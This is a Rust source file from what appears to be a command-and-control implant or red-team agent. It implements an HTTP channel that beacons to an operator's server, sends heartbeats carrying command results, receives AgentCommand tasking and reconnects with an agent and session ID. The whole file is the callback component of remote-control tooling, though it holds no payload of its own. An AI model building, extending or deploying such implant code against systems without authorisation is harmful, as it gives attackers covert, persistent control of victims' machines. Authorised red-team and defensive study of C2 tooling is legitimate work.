use crate::communication::beacon_http; 
use crate::communication::comm::channel::CommChannel;
use crate::post::commands::AgentCommand;
use crate::utils::logger::Logger;


pub struct HTTPCommChannel {
    pub address: String,
    pub retries: u64,
    pub timeout: u64
}

#[async_trait::async_trait]
impl CommChannel for HTTPCommChannel {
    async fn initial_beacon(&self, logger: &Logger, key: &Vec<u8>,
    ) -> (u64, String) {
        let address = format!("{}/beacon", self.address);
        dbg!(&address);
        beacon_http::initial_beacon(&address, self.retries, self.timeout, logger, key).await
    }

    async fn heartbeat(&self, agent_id: u64, session_id: &str, 
        result: Option<Vec<String>>, logger: &Logger
    ) -> Option<Vec<AgentCommand>> {
        let address = format!("{}/heartbeat", self.address);
        dbg!(&address);
        beacon_http::heartbeat(&address, agent_id, session_id, self.timeout, result, logger).await
    }

    async fn reconnect(
        &self, agent_id: u64, session_id: &str, logger: &Logger,
    ) -> (u64, String) {
        let address = format!("{}/reconnect", self.address);
        dbg!(&address);
        beacon_http::reconnect(&address, agent_id, session_id, self.timeout, logger).await
    }
}